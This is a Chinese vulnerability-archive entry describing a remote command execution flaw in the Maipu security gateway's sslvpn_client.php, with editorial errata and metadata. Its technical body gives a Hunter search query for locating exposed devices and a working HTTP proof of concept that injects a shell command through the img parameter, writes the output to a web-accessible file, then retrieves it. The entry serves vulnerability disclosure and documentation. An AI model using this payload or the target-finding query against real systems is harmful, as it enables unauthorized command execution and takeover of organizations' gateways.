---
source: "wy876 漏洞文库"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "迈普安全网关sslvpn_client存在远程命令执行漏洞"
product: "迈普安全网关"
record_type: "unknown"
document_type: "技术文章（细分类待核）"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "影响字段仅产品无版本"
side_effects: "写ceshi.txt具有副作用且无回显/清理"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/%E8%BF%88%E6%99%AE%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3sslvpn_client%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
hunter: "app.name==\"MAIPU 迈普 MPSec\""
source_url: "https://www.yuque.com/xiaokp7/ocvun2/gkyi7fg6n1r30x4f"
id: "vw-d8582a637207dffb1f556282"
entity_id: "ve-d8582a637207dffb1f556282"
schema_version: "1"
previous_fofa_unverified: "app.name=="
---

# 迈普安全网关sslvpn_client存在远程命令执行漏洞

> 指纹历史字段校订（2026-10-04）：现有完整平台查询保持原值；旧未核字段中的残片逐字迁入 `previous_*`。此迁移不代表已确定原文其他谓词的组合意图，未给出的 AND/OR 不猜补。后文残片字段的旧诊断描述校订前状态，查询仍不证明资产受影响。

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：迈普安全网关
- 文献类型：技术文章（细分类待核）
- 版本、权限及部署边界：影响字段仅产品无版本
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. Hunter表达式被错存FOFA且只app.name==
2. 影响字段仅产品无版本
3. HTTP误标java
4. 写ceshi.txt具有副作用且无回显/清理
5. 与鑫塔博达同请求但不同产品，需核OEM关系不可直接合并

### 操作风险

写ceshi.txt具有副作用且无回显/清理

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://www.yuque.com/xiaokp7/ocvun2/gkyi7fg6n1r30x4f>

### 归档技术正文

# 一、漏洞简介
迈普安全网关sslvpn_client存在远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 迈普安全网关

# 三、资产测绘
+ hunter`app.name=="MAIPU 迈普 MPSec"`
+ 特征

# 四、漏洞复现
```http
GET /sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/ceshi.txt|ls HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```


获取命令执行结果

```http
GET /sslvpn/ceshi.txt HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gkyi7fg6n1r30x4f>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
